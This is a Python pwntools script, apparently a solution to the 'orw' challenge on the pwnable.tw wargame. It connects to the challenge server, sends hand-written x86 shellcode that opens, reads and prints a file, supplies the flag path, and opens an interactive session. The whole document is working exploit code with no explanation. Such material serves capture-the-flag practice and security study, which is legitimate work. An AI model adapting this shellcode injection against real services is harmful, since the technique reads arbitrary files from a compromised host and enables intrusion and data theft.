#!/usr/bin/env python
from pwn import *

m = remote('chall.pwnable.tw',10001)

orw = asm('''
    mov eax, 0x03
    xor ebx, ebx
    mov ecx, esp
    mov edx, 0x0e
    int 0x80
open:
    mov ebx, esp
    mov eax, 0x05
    xor ecx, ecx
    xor edx, edx
    int 0x80
read:
    mov ebx, eax
    mov eax, 0x03
    mov ecx, esp
    mov edx, 0x50
    int 0x80
write:
    mov ebx, 1
    mov eax, 0x04
    mov ecx, esp
    mov edx, 0x50
    int 0x80
exit:
    mov eax, 1
    int 0x80
''')
m.recvuntil(':')
m.send(orw)
sleep(1)
m.send('/home/orw/flag')
m.interactive()
